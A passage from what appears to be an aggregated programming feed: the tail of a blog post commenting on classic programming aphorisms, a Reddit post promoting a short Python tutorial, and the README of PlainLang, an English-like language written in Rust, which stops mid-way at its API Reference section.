Make a user interface as consistent and as predictable as possible. Contributed by several readers</p></blockquote><p><em>*weeps*</em> Why isn't this hammered into every programmer? Today's tools are filled with hidden UI gestures, random menus, and a complete disregard for the user's time.</p><blockquote><p>A program designed for inputs from people is usually stressed beyond the breaking point by computer-generated inputs. Dennis Ritchie. Bell Labs</p></blockquote><p>I think this one is mostly irrelevant now. Humans can only type at a limited speed, but computers can generate massive amounts of data instantly. But our machines' abilities to ingest that data has also grown. I suppose the nearest thing is the DDoS - where a webserver designed for a few visitors is overwhelmed by a flood of automated and malicious requests.</p><blockquote><p>Twenty percent of all input forms filled out by people contain bad data. Vic Vyssotsky. Bell Labs</p></blockquote><p>Ha! Vic didn't know that we'd have <code><input> validation in the 21st century! But, yeah, people write all sorts of crap into forms.</code></p><blockquote><p>Eighty percent of all input forms ask questions they have no business asking. Mike Garey. Bell Labs</p></blockquote><p>Mike was sent from the future to warn the people of the past - but they paid him no heed.</p><blockquote><p>Don't make the user provide information that the system already knows. Rick Lemons. Cardinal Data Systems</p></blockquote><p>I'm going to slightly disagree with Rick here. Asking for repeated information is a reasonable way to double-check you've got that information correct. It also helps to validate that the user is who they say they are.</p><blockquote><p>For 80 percent of all data sets, 95 percent of the information can be seen in a good graph. William S. Cleveland. Bell Labs</p></blockquote><p>Those of us who have seen <a href="https://en.wikipedia.org/wiki/Anscombe's_quartet">Anscombe's quartet</a> know how true this is.</p><h2> <a href="https://shkspr.mobi#debugging">Debugging</a> </h2> <blockquote><p>Of all my programming bugs, 80 percent are syntax errors. Of the remaining 20 percent, 80 percent are trivial logical errors. Of the remaining 4 percent, 80 percent are pointer errors. And the remaining 0.8 percent are hard. Marc Donner. IBM T. J. Watson Research Center</p></blockquote><p>Syntax errors are rarer now that we have IDEs. And I hope visual programming languages will further reduce them. Logic errors still plague us. Pointer errors have been eradicated unless you're working at the very lowest levels. And I'd say the number of "hard" bugs is probably higher now due to the complex interaction of multiple libraries and systems.</p><blockquote><p>It takes three times the effort to find and fix bugs in system test than when done by the developer. It takes ten times the effort to find and fix bugs in the field than when done in system test. Therefore, insist on unit tests by the developer. Larry Bernstein. Bell Communications Research</p></blockquote><p>We can quibble about the numbers and the ratios - but it is generally harder to fix in prod. That said, getting crash logs from the field has considerable shortened those ratio.</p><blockquote><p>Don&rsquo;t debug standing up. It cuts your patience in half, and you need all you can muster. Dave Storer. Cedar Rapids, Iowa</p></blockquote><p>I'm with Team-Standing-Desk! So I think Dave is wrong.</p><blockquote><p>Don&rsquo;t get suckered in by the comments - they can be terribly misleading. Debug only the code. Dave Storer. Cedar Rapids, Iowa</p></blockquote><p>Hmmm. Yes, this is probably correct. I'm not going to say code is self-documenting these days; but it certainly is a lot easier to read.</p><blockquote><p>Testing can show the presence of bugs, but not their absence. Edsger W. Dijkstra. University of Texas</p></blockquote><p>Dare we disagree with Dijkstra?! Well, perhaps a little. With modern fuzzing tools we can show the absence of certain kinds of bugs.</p><blockquote><p>Each new user of a new system uncovers a new class of bugs. Brian Kernighan. Bell Labs</p></blockquote><p>Yup! Our code would be bug-free if it weren't for those pesky users!</p><blockquote><p>If it ain&rsquo;t broke, don&rsquo;t fix it. Ronald Reagan. Santa Barbara, California</p></blockquote><p>Amongst the many things about which to disagree with the former President, this is up there! Code needs maintenance. Some things aren't broke until all of a sudden they are. Sure, maybe don't change your app's layout because a manager wants a bonus; but things constantly need fixing.</p><blockquote><p>[The Maintainer&rsquo;s Motto] If we can&rsquo;t fix it, it ain&rsquo;t broke. Lieutenant Colonel Walt Weir. United States Army</p></blockquote><p>I believe in you. Self deprecation is fine, but self confidence is better.</p><blockquote><p>The first step in fixing a broken program is getting it to fail repeatably. Tom Duff. Bell Labs</p></blockquote><p>Yes! Transient errors are the worst! And a huge source of the "it works for me" antipattern.</p><h2> <a href="https://shkspr.mobi#performance">Performance</a> </h2> <blockquote><p>[The First Rule of Program Optimization] Don&rsquo;t do it. [The Second Rule of Program Optimization - for experts only] Don't do it yet. Michael Jackson. Michael Jackson Systems Ltd.</p></blockquote><p>As true now as it ever was.</p><blockquote><p>The fastest algorithm can frequently be replaced by one that is almost as fast and much easier to understand. Douglas W. Jones. University of Iowa</p></blockquote><p>I'm only <em>mostly</em> in agreement here. Many of the security bugs we see in modern code are due to "clever" tricks which turn out to have nasty strings attached. But, at the microcode level, performance is still everything. And a well-tested fast algorithm may be necessary. As part of the climate crisis we should all be thinking about the efficiency of our code.</p><blockquote><p>On some machines indirection is slower with displacement, so the most-used member of a structure or a record should be first. Mike Morton. Boston, Massachusetts</p></blockquote><p>We live in an age of ridiculously fast SSD and RAM access times. Sequential reads are still slightly faster than random jumps, and structures like <a href="https://en.wikipedia.org/wiki/B-tree">B-Tree</a> give us a good mix of the two. We don't need to align data to the physical tracks of a spinning disk any more.</p><blockquote><p>In non-I/O-bound programs, a few percent of the source code typically accounts for over half the run time. Don Knuth. Stanford University</p></blockquote><p>I wonder how true this now is? Perhaps we could replace "I/O" with "Internet requests" and still be accurate?</p><blockquote><p>Before optimizing, use a profiler to locate the &ldquo;hot spots&rdquo; of the program. Mike Morton. Boston, Massachusetts</p></blockquote><p>Mostly true. But you don't lose much by doing some manual optimisations that you know (from bitter experience) will make a difference.</p><blockquote><p>[Conservation of Code Size] When you turn an ordinary page of code into just a handful of instructions for speed, expand the comments to keep the number of source lines, constant. Mike Morton. Boston, Massachusetts</p></blockquote><p>I don't think this is relevant these days. Perhaps it is useful to spend time explaining exactly what trickery you're pulling off with weird syntax. But our tools are now line-count agnostic. Mostly.</p><blockquote><p>If the programmer can simulate a construct faster than the compiler can implement the construct itself, then the compiler writer has blown it badly. Guy L. Steele, Jr. Tartan Laboratories</p></blockquote><p>I think this is rather self-evident. But compilers are so ridiculously optimised that this scenario is increasingly rare.</p><blockquote><p>To speed up an I/O-bound program, begin by accounting for all I/O. Eliminate that which is unnecessary or redundant, and make the remaining as fast as possible. David Martin. Norristown, Pennsylvania</p></blockquote><p>I think this can be generalised even further. I'm reminded of <a href="https://github.com/npm/npm/issues/11283">NPM's progress bar slowdown issue</a>. There's a lot of redundancy which can be removed in many programs.</p><blockquote><p>The fastest I/O is no I/O. Nils-Peter Nelson. Bell Labs</p></blockquote><p>Man! They were <em>obsessed</em> with I/O back in the day! At large volumes, it is still an issue. But perhaps now we can relax just a little?</p><blockquote><p>The cheapest, fastest, and most reliable components of a computer system are those that aren&rsquo;t there. Gordon Bell. Encore Computer Corporation</p></blockquote><p>A little unfair, I think. It's cheaper to have less RAM, but that doesn't make my laptop faster.</p><blockquote><p>[Compiler Writer&rsquo;s Motto-Optimization Pass] Making a wrong program worse is no sin. Bill McKeeman. Wang Znstitute</p></blockquote><p>Personally, I don't think it is the compiler's job to tell me I'm doing it wrong.</p><blockquote><p>Electricity travels a foot in a nanosecond. Commodore Grace Murray Hopper. United States Navy</p></blockquote><p>And a nano-Century is Pi seconds! One of those pub-trivia facts which are irrelevant to modern computing.</p><blockquote><p>LISP programmers know the value of everything but the cost of nothing. Alan Perlis. Yale University</p></blockquote><p>Nowadays LISP programmers are a protected species and shouldn't be subject to such harsh treatment.</p><blockquote><p>[Little&rsquo;s Formula] The average number of objects in a queue is the product of the entry rate and the average holding time. Richard E. Fairley. Wang Institute</p></blockquote><p>Another of those truisms which kinda don't matter in a world with infinite disk space. Speed is our greatest worry.</p><h2> <a href="https://shkspr.mobi#documentation">Documentation</a> </h2> <blockquote><p>[The Test of Negation] Don&rsquo;t include a sentence in documentation if its negation is obviously false. Bob Martin. AT&amp;T Technologies</p></blockquote><p>I don't know if that's the same guy as <a href="https://blog.wesleyac.com/posts/robert-martin">Uncle Bob</a> - but it sounds like the sort of claptrap he'd come up with. What's obvious to you might not be obvious to others. Test your writing with your audience to see if they understand your meaning.</p><blockquote><p>When explaining a command, or language feature, or hardware widget, first describe the problem it is designed to solve. David Martin. Norristown, Pennsylvania</p></blockquote><p>Agreed. It doesn't need to be an essay, but documentation needs context.</p><blockquote><p>[One Page Principle] A (specification, design, procedure, test plan) that will not fit on one page of 8.5-by-11 inch paper cannot be understood. Mark Ardis. Wang Institute</p></blockquote><p>I do have some sympathy with this - see the Two-Pizza rule above - but I think this ignores the reality of modern systems. Yes, we should keep things simple, but we also have to recognise that complexity is unavoidable.</p><blockquote><p>The job&rsquo;s not over until the paperwork&rsquo;s done. Anon</p></blockquote><p>Amen!</p><h2> <a href="https://shkspr.mobi#managing-software">Managing Software</a> </h2> <blockquote><p>The structure of a system reflects the structure of the organization that built it. Richard E. Fairley. Wang Institute</p></blockquote><p>This is <a href="https://en.wikipedia.org/wiki/Conway%27s_law">Conway's Law</a> and it is still fairly true. <a href="https://dl.acm.org/doi/10.1109/RESER.2013.14">Some studies show it is possible to break out of the paradigm</a> but it holds remarkable power.</p><blockquote><p>Don&rsquo;t keep doing what doesn&rsquo;t work. Anon</p></blockquote><p>If only we could tattoo this on the inside of our eyelids, eh?</p><blockquote><p>[Rule of Credibility] The first 90 percent of the code accounts for the first 90 percent of the development time. The remaining 10 percent of the code accounts for the other 90 percent of the development time. Tom Cargill. Bell Labs</p></blockquote><p>Agile methodology has <em>somewhat</em> dimmed the potency of this prediction. I think people are <em>generally</em> better at estimating now. But it is hard to escape <a href="https://shkspr.mobi/blog/2022/12/zenos-paradox-and-why-modern-technology-is-rubbish/">Zeno's Paradox</a>.</p><blockquote><p>Less than 10 percent of the code has to do with the ostensible purpose of the system; the rest deals with input-output, data validation, data structure maintenance, and other housekeeping. May Shaw. Carnegie-Mellon University</p></blockquote><p>How many times have you installed a simple program only to see it pull in every dependency under the sun? We need an awful lot of scaffolding to keep our houses standing.</p><blockquote><p>Good judgment comes from experience, and experience comes from bad judgment. Fred Brooks. University of North Carolina</p></blockquote><p>I lean <em>slightly</em> towards this. I also strongly believe that you can pick up a lot of good judgement by listening to your users.</p><blockquote><p>Don&rsquo;t write a new program if one already does more or less what you want. And if you must write a program, use existing code to do as much of the work as possible. Richard Hill. Hewlett-Packard S.A. Geneva, Switzerland</p></blockquote><p>This is the open source way. Much easier to fork than start again. But at some point you'll run up against an unwanted design decision which will be load-bearing. Think carefully before you re-use.</p><blockquote><p>Whenever possible, steal code. Tom Duff. Bell Labs</p></blockquote><p>ITYM "Respect the terms of an OSI approved Open Source licence" - don't you, Tom?</p><blockquote><p>Good customer relations double productivity. Larry Bernstein. Bell Communications Research</p></blockquote><p>A lesson learned by Apple and ignored by Google.</p><blockquote><p>Translating a working program to a new language or system takes 10 percent of the original development time or manpower or cost. Douglas W. Jones University of Iowa</p></blockquote><p>I honestly don't know how true that is any more. Automated tools must surely have improved that somewhat?</p><blockquote><p>Don&rsquo;t use the computer to do things that can be done efficiently by hand. Richard Hill. Hewlett-Packard S.A. Geneva, Switzerland</p></blockquote><p>A rare disagreement! Things can be efficiently done by hand <em>once or twice</em> but after that, go nuts! Even if it's something as simple as renaming a dozen files in a directory, you'll learn something interesting from automating it.</p><blockquote><p>I&rsquo;d rather write programs to write programs than write programs. Dick Sites. Digital Equipment Corporation</p></blockquote><p>There will always be people who love working on the meta-task. They're not wrong for doing so, but it can be an unhelpful distraction sometimes.</p><blockquote><p>[Brooks&rsquo;s Law of Prototypes] Plan to throw one away, you will anyhow. Fred Brooks. University of North Carolina</p></blockquote><p>I'd go further an suggest throwing out even more. It can be hard to sell that to management - but it is necessary.</p><blockquote><p>If you plan to throw one away, you will throw away two. Craig Zerouni. Computer FX Ltd. London, England</p></blockquote><p>Craig with the double-tap!</p><blockquote><p>Prototyping cuts the work to produce a system by 40 percent. Larry Bernstein. Bell Communications Research</p></blockquote><p>Minor disagreement. Prototyping <em>is</em> part of the work. And it should probably take a considerable amount of time.</p><blockquote><p>[Thompson&rsquo;s rule for first-time telescope makers] It is faster to make a four-inch mirror then a six-inch mirror than to make a six-inch mirror. Bill McKeeman. Wang Institute</p></blockquote><p>Yes. It is always tempting to go for the big win. But baby-steps!</p><blockquote><p>Furious activity is no substitute for understanding. H. H. Williams. Oakland, California</p></blockquote><p>Goodness me, yes! It's always tempting to rush in pell-mell. But that's a poor use of time.</p><blockquote><p>Always do the hard part first. If the hard part is impossible, why waste time on the easy part? Once the hard part is done, you&rsquo;re home free. Always do the easy part first. What you think at first is the easy part often turns out to be the hard part. Once the easy part is done, you can concentrate all your efforts on the hard part. Al Schapira. Bell Labs</p></blockquote><p>Oh, Al! You card! Luckily, there are very few "basic" problems to be solved in modern computing. We know what most of the hard problems are. Perhaps Agile teaches us to always leave software in a working state, so we start with the easy parts?</p><blockquote><p>If you lie to the computer, it will get you. Perry Farrar. Germantown, Maryland</p></blockquote><p>We shouldn't anthropomorphise computers; they don't like it. Actually, nowadays it's is quite common to "lie" to computers with dummy data and virtualised environments. It's fine.</p><blockquote><p>If a system doesn&rsquo;t have to be reliable, it can do anything else. H. H. Williams. Oakland, California</p></blockquote><p>Perhaps it is my imagination, but we seem less concerned with reliability these days. A Tesla car is a wonderful example of that.</p><blockquote><p>One person&rsquo;s constant is another person&rsquo;s variable. Susan Gerhart. Microelectronics and Computer Technology Corp.</p></blockquote><p>I wonder about this one a lot. Scoped access to variables possibly makes this less of an issue in the 21st century?</p><blockquote><p>One person&rsquo;s data is another person&rsquo;s program. Guy L. Steele, Jr. Tartan Laboratories</p></blockquote><p>I don't quite get this. Anyone care to explain?</p><blockquote><p>Eschew clever rules. Joe Condon. Bell Labs</p></blockquote><p>The pearls end with this gem.</p><h2> <a href="https://shkspr.mobi#what-have-we-learned-today">What have we learned today?</a> </h2><p>The majority of my disagreements are minor quibbles. And while disk-bound I/O is rarely a problem, network latency has replaced it as the main cause of delays. We've managed to fix some things, but many seem irrevocably tied to the human condition.</p><p>Which one was your favourite?</p></div></section>]]></description><pubDate>Fri, 05 Sep 2025 19:45:00 +0530</pubDate></item><item><link>https://www.youtube.com/watch?v=uBhe1Rvp4PI</link><title>Made a tutorial Python in 10 minutes for beginners (with homework) (youtube.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n92nbh/made_a_tutorial_python_in_10_minutes_for/</guid><comments>https://www.reddit.com/r/programming/comments/1n92nbh/made_a_tutorial_python_in_10_minutes_for/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 1 min | <a href='https://www.reddit.com/r/programming/comments/1n92nbh/made_a_tutorial_python_in_10_minutes_for/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I just uploaded a short and beginner-friendly <strong>Python tutorial</strong> on YouTube where I explain the core concepts in only 10 minutes.<br/>Perfect if you&#39;re just starting out or need a quick refresher.<br/>Would love your feedback on whether you&#39;d like to see more quick lessons like this.</p><p>Thanks!</p></div><!-- SC_ON --></section><section class='embedded-media'><iframe width="356" height="200" src="https://www.youtube.com/embed/uBhe1Rvp4PI?feature=oembed&enablejsapi=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen title="Learn Python in 10 minutes for Beginners! (with homework)"></iframe></section>]]></description><pubDate>Fri, 05 Sep 2025 16:56:39 +0530</pubDate></item><item><link>https://github.com/StudioPlatforms/plain-lang</link><title>Building a programming language that reads like English: lessons from PlainLang (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n920j7/building_a_programming_language_that_reads_like/</guid><comments>https://www.reddit.com/r/programming/comments/1n920j7/building_a_programming_language_that_reads_like/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 26 min | <a href='https://www.reddit.com/r/programming/comments/1n920j7/building_a_programming_language_that_reads_like/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Recently I started working on an experimental language called <strong>PlainLang</strong>, with the idea of making programming feel closer to natural conversation. Instead of symbols and punctuation, you write in full sentences like:</p><pre><code>set the greeting to &quot;Hello World&quot;.show on screen the greeting.</code></pre><p>From a technical standpoint, there were a few interesting challenges i thought might be worth sharing here:</p><ul><li><strong>Parsing “loose” English</strong>: Traditional parsers expect rigid grammar. PlainLang allows optional words like “the”, “a”, or “then”, so the parser had to be tolerant without losing structure. I ended up with a recursive descent parser tuned for flexibility, which was trickier than expected.</li><li><strong>Pronoun support</strong>: The language lets you use “it” to refer to the last computed result. That required carrying contextual state across statements in the runtime, a design pattern that feels simple in usage but was subtle to implement correctly.</li><li><strong>Error messages that feel human</strong>: If someone writes <code>add 5 to score</code> without first setting <code>score</code>, the runtime tries to explain it in plain terms rather than spitting out a stack trace. Writing helpful diagnostics for “English-like” code took some care.</li></ul><p>The project is still young, but it already supports variables, arithmetic, conditionals, loops, and an interactive REPL.</p><p>I’d be interested in hearing from others who have tried making more “human-readable” languages what trade-offs did you find between natural syntax and precise semantics?</p><p>The code is open source (MIT license)   </p></div><!-- SC_ON --></section><section class='separator separator-after-selftext'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><article><h2>Plain Programming Language</h2><a href="https://github.com#plain-programming-language"></a><p><a href="https://opensource.org/licenses/MIT"><img src="https://camo.githubusercontent.com/6cd0120cc4c5ac11d28b2c60f76033b52db98dac641de3b2644bb054b449d60c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d79656c6c6f772e737667" alt="License: MIT"></a> <a href="https://www.rust-lang.org/"><img src="https://camo.githubusercontent.com/b46f750af5c3a98977b2d984c82741c8b78d3e08b3621bfb890e2364200d7679/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f727573742d312e37302532422d6f72616e6765" alt="Rust"></a></p><p>Plain is a minimalist, English-like programming language designed to make programming feel like natural conversation. It combines the power of traditional programming with intuitive, human-readable syntax.</p><h2>Table of Contents</h2><a href="https://github.com#table-of-contents"></a> <ul> <li><a href="https://github.com#overview">Overview</a></li> <li><a href="https://github.com#features">Features</a></li> <li><a href="https://github.com#installation">Installation</a></li> <li><a href="https://github.com#quick-start">Quick Start</a></li> <li><a href="https://github.com#language-syntax">Language Syntax</a> <ul> <li><a href="https://github.com#variables-and-assignment">Variables and Assignment</a></li> <li><a href="https://github.com#arithmetic-operations">Arithmetic Operations</a></li> <li><a href="https://github.com#output-and-display">Output and Display</a></li> <li><a href="https://github.com#conditional-statements">Conditional Statements</a></li> <li><a href="https://github.com#loops">Loops</a></li> <li><a href="https://github.com#sequences-and-flow-control">Sequences and Flow Control</a></li> <li><a href="https://github.com#pronouns-and-context">Pronouns and Context</a></li> </ul> </li> <li><a href="https://github.com#architecture">Architecture</a></li> <li><a href="https://github.com#implementation-details">Implementation Details</a></li> <li><a href="https://github.com#cli-interface">CLI Interface</a></li> <li><a href="https://github.com#examples">Examples</a></li> <li><a href="https://github.com#api-reference">API Reference</a></li> <li><a href="https://github.com#development">Development</a></li> <li><a href="https://github.com#testing">Testing</a></li> <li><a href="https://github.com#contributing">Contributing</a></li> <li><a href="https://github.com#license">License</a></li> </ul><p></p><h2>Overview</h2><a href="https://github.com#overview"></a><p>Plain reimagines programming by using natural English sentences instead of cryptic symbols and keywords. Instead of writing:</p><div><pre><span>let</span> <span>distance</span> <span>=</span> <span>5</span><span>;</span> <span>distance</span> <span>+=</span> <span>18</span><span>;</span> <span>console</span><span>.</span><span>log</span><span>(</span><span>distance</span><span>)</span><span>;</span></pre></div><p>You can write:</p><div><pre><code>set the distance to 5. add 18 to the distance then display it. </code></pre></div><p>The language maintains full programming power while being accessible to beginners and readable like plain English.</p><h2>Features</h2><a href="https://github.com#features"></a> <ul> <li>&#9989; <strong>Natural English Syntax</strong>: Write code using everyday language patterns</li> <li>&#9989; <strong>Pronoun Support</strong>: Use "it" to refer to previous results</li> <li>&#9989; <strong>Flexible Statements</strong>: Support for sequences with "then"</li> <li>&#9989; <strong>Mathematical Operations</strong>: Addition, subtraction, and comparisons</li> <li>&#9989; <strong>Conditional Logic</strong>: If-then statements with natural syntax</li> <li>&#9989; <strong>Loop Constructs</strong>: Count-based iteration</li> <li>&#9989; <strong>Variable Management</strong>: Simple variable declaration and manipulation</li> <li>&#9989; <strong>Output Handling</strong>: Display results with natural phrasing</li> <li>&#9989; <strong>Interactive REPL</strong>: Command-line interface for experimentation</li> <li>&#9989; <strong>Extensible Architecture</strong>: Clean separation of concerns for future features</li> </ul><p></p><h2>Installation</h2><a href="https://github.com#installation"></a> <h3>Prerequisites</h3><a href="https://github.com#prerequisites"></a> <ul> <li><strong>Rust</strong>: Version 1.70 or later</li> <li><strong>Cargo</strong>: Rust's package manager (included with Rust)</li> </ul><p></p><h3>Building from Source</h3><a href="https://github.com#building-from-source"></a><div><pre><span><span>#</span> Clone the repository</span> git clone https://github.com/yourusername/plain-lang.git <span>cd</span> plain-lang <span><span>#</span> Build the project</span> cargo build --release <span><span>#</span> Run tests (optional)</span> cargo <span>test</span></pre></div><p>The compiled binary will be available at <code>target/release/plain-lang</code>.</p><h3>Direct Usage</h3><a href="https://github.com#direct-usage"></a><p>After building, you can run Plain programs directly:</p><div><pre><span><span>#</span> Run a Plain source file</span> ./target/release/plain-lang run examples/demo.plain <span><span>#</span> Start the interactive REPL</span> ./target/release/plain-lang</pre></div><h2>Quick Start</h2><a href="https://github.com#quick-start"></a><p>Create a file called <code>hello.plain</code>:</p><div><pre><code>set the greeting to "Hello World". show on screen the greeting. </code></pre></div><p>Run it:</p><div><pre>plain-lang run hello.plain</pre></div><p>Expected output:</p><h2>Language Syntax</h2><a href="https://github.com#language-syntax"></a><p></p><h3>Variables and Assignment</h3><a href="https://github.com#variables-and-assignment"></a><p><strong>Basic Assignment:</strong></p><div><pre><code>set the variable_name to 42. set my_name to "Alice". </code></pre></div><p><strong>With Articles:</strong></p><div><pre><code>set the distance to 100. set the message to "Welcome". </code></pre></div><p>Variables can hold integers or strings and are case-sensitive.</p><h3>Arithmetic Operations</h3><a href="https://github.com#arithmetic-operations"></a><p><strong>Addition:</strong></p><div><pre><code>set the score to 10. add 5 to the score. add 3 to score then display it. </code></pre></div><p><strong>Subtraction:</strong></p><div><pre><code>set the temperature to 72. subtract 10 from the temperature. </code></pre></div><p><strong>Result Tracking:</strong> All arithmetic operations automatically update the internal "last result" for pronoun usage.</p><h3>Output and Display</h3><a href="https://github.com#output-and-display"></a><p><strong>Basic Display:</strong></p><div><pre><code>set the message to "Hello". show on screen the message. display the message. </code></pre></div><p><strong>Pronoun Usage:</strong></p><div><pre><code>add 5 to the counter then display it. </code></pre></div><p><strong>Flexible Output:</strong></p><div><pre><code>show on screen the result. display the current_value. </code></pre></div><h3>Conditional Statements</h3><a href="https://github.com#conditional-statements"></a><p><strong>Simple Conditions:</strong></p><div><pre><code>set the age to 25. if age is greater than 18 then show on screen "Adult". </code></pre></div><p><strong>With Articles:</strong></p><div><pre><code>if the temperature is less than 0 then display "Freezing". </code></pre></div><p><strong>Comparison Operators:</strong></p><ul> <li><code>is greater than</code></li> <li><code>is less than</code></li> <li><code>is equal to</code></li> </ul> <h3>Loops</h3><a href="https://github.com#loops"></a><p><strong>Count-based Loops:</strong></p><div><pre><code>count to 5 and when you are done display "Done". set the counter to 0. count to 10 and when you are done show on screen the counter. </code></pre></div><p>The loop executes the body statement the specified number of times.</p><h3>Sequences and Flow Control</h3><a href="https://github.com#sequences-and-flow-control"></a><p><strong>Statement Chaining:</strong></p><div><pre><code>set the value to 10 then add 5 to value then display it. </code></pre></div><p><strong>Complex Sequences:</strong></p><div><pre><code>set the score to 0. add 10 to the score then display it. if score is greater than 5 then add 5 to score then display it. </code></pre></div><h3>Pronouns and Context</h3><a href="https://github.com#pronouns-and-context"></a><p><strong>Automatic Context Tracking:</strong></p><div><pre><code>set the distance to 100. add 50 to the distance. display it. </code></pre></div><p>In this example, "it" refers to the result of the addition (150).</p><p><strong>Pronoun Rules:</strong></p><ul> <li>"it" always refers to the most recent computed result</li> <li>Pronouns work across all operations that produce values</li> <li>Context is maintained throughout program execution</li> </ul> <h2>Architecture</h2><a href="https://github.com#architecture"></a><p></p><h3>Core Components</h3><a href="https://github.com#core-components"></a><div><pre><code>plain-lang/ &#9500;&#9472;&#9472; src/ &#9474; &#9500;&#9472;&#9472; main.rs # CLI entry point &#9474; &#9500;&#9472;&#9472; lexer.rs # Tokenization (logos-based) &#9474; &#9500;&#9472;&#9472; parser.rs # Recursive descent parsing &#9474; &#9500;&#9472;&#9472; ast.rs # Abstract Syntax Tree definitions &#9474; &#9500;&#9472;&#9472; runtime.rs # Execution engine &#9474; &#9500;&#9472;&#9472; repl.rs # Interactive REPL &#9474; &#9492;&#9472;&#9472; lib.rs # Module declarations &#9500;&#9472;&#9472; examples/ # Sample programs &#9492;&#9472;&#9472; Cargo.toml # Dependencies and metadata </code></pre></div><h3>Execution Pipeline</h3><a href="https://github.com#execution-pipeline"></a> <ol> <li><strong>Lexical Analysis</strong>: Source text &rarr; tokens</li> <li><strong>Parsing</strong>: Tokens &rarr; AST</li> <li><strong>Type Checking</strong>: Semantic validation (stub for future)</li> <li><strong>Code Generation</strong>: AST &rarr; executable form (interpreter)</li> <li><strong>Execution</strong>: Runtime evaluation with state management</li> </ol><p></p><h3>Key Design Decisions</h3><a href="https://github.com#key-design-decisions"></a> <ul> <li><strong>Interpreter Architecture</strong>: Tree-walking interpreter for simplicity and debugging</li> <li><strong>Context Tracking</strong>: <code>last_value</code> system for natural pronoun support</li> <li><strong>Flexible Parsing</strong>: Extensive optional tokens for natural language variation</li> <li><strong>Error Handling</strong>: Descriptive error messages for debugging</li> </ul> <h2>Implementation Details</h2><a href="https://github.com#implementation-details"></a><p></p><h3>Lexer (lexer.rs)</h3><a href="https://github.com#lexer-lexerrs"></a> <ul> <li>Uses the <code>logos</code> crate for efficient tokenization</li> <li>Case-insensitive keywords with regex patterns</li> <li>Comprehensive token set covering English-like constructs</li> </ul> <h3>Parser (parser.rs)</h3><a href="https://github.com#parser-parserrs"></a> <ul> <li>Recursive descent parser with manual precedence handling</li> <li>Extensive support for optional tokens ("the", articles, etc.)</li> <li>Context-aware parsing with position tracking</li> <li>Robust error reporting with position information</li> </ul><p></p><h3>Runtime (runtime.rs)</h3><a href="https://github.com#runtime-runtimers"></a> <ul> <li>Variable storage using <code>HashMap<string></string></code></li> <li>Result caching with <code>last_value</code> for pronoun support</li> <li>Tree-walking evaluation of AST nodes</li> <li>Type-safe operations with explicit error handling</li> </ul> <h3>AST (ast.rs)</h3><a href="https://github.com#ast-astrs"></a><div><pre><span>pub</span> <span>enum</span> <span>Stmt</span> <span>{</span> <span>Set</span><span>(</span><span>String</span><span>,</span> <span>Expr</span><span>)</span><span>,</span> <span>Add</span><span>(</span><span>Expr</span><span>,</span> <span>String</span><span>)</span><span>,</span> <span>Sub</span><span>(</span><span>Expr</span><span>,</span> <span>String</span><span>)</span><span>,</span> <span>Show</span><span>(</span><span>Expr</span><span>)</span><span>,</span> <span>If</span><span>(</span><span>Expr</span><span>,</span> <span>Box</span><span>&lt;</span><span>Stmt</span><span>&gt;</span><span>)</span><span>,</span> <span>Seq</span><span>(</span><span>Box</span><span>&lt;</span><span>Stmt</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>Stmt</span><span>&gt;</span><span>)</span><span>,</span> <span>Loop</span><span>(</span><span>Expr</span><span>,</span> <span>Box</span><span>&lt;</span><span>Stmt</span><span>&gt;</span><span>)</span><span>,</span> <span>}</span> <span>pub</span> <span>enum</span> <span>Expr</span> <span>{</span> <span>Int</span><span>(</span><span>i64</span><span>)</span><span>,</span> <span>Str</span><span>(</span><span>String</span><span>)</span><span>,</span> <span>Var</span><span>(</span><span>String</span><span>)</span><span>,</span> <span>LastValue</span><span>,</span> <span>// For pronouns</span> <span>Gt</span><span>(</span><span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span><span>,</span> <span>Lt</span><span>(</span><span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span><span>,</span> <span>Eq</span><span>(</span><span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span><span>,</span> <span>}</span></pre></div><p></p><h2>CLI Interface</h2><a href="https://github.com#cli-interface"></a> <h3>Commands</h3><a href="https://github.com#commands"></a><div><pre>plain-lang run <span>&lt;</span>file<span>&gt;</span> <span><span>#</span> Execute a Plain source file</span> plain-lang <span><span>#</span> Start interactive REPL</span> plain-lang --help <span><span>#</span> Display help information</span></pre></div><p></p><h3>REPL Mode</h3><a href="https://github.com#repl-mode"></a><div><pre><code>$ plain-lang Plain&gt; set the value to 42. Plain&gt; display it. 42 Plain&gt; add 8 to value then display it. 50 </code></pre></div><h3>File Execution</h3><a href="https://github.com#file-execution"></a><div><pre>$ plain-lang run examples/demo.plain 23 23 ...</pre></div><p></p><h2>Examples</h2><a href="https://github.com#examples"></a> <h3>Basic Arithmetic</h3><a href="https://github.com#basic-arithmetic"></a><div><pre><code>set the x to 10. add 5 to x. display it. </code></pre></div><p></p><h3>Conditional Logic</h3><a href="https://github.com#conditional-logic"></a><div><pre><code>set the temperature to 75. if temperature is greater than 70 then display "Warm". </code></pre></div><h3>Loops with Context</h3><a href="https://github.com#loops-with-context"></a><div><pre><code>set the counter to 0. count to 5 and when you are done display the counter. </code></pre></div><p></p><h3>Complex Sequences</h3><a href="https://github.com#complex-sequences"></a><div><pre><code>set the score to 100. add 25 to score then display it. if score is greater than 120 then show on screen "High Score". </code></pre></div><h2>API Reference</h2><a 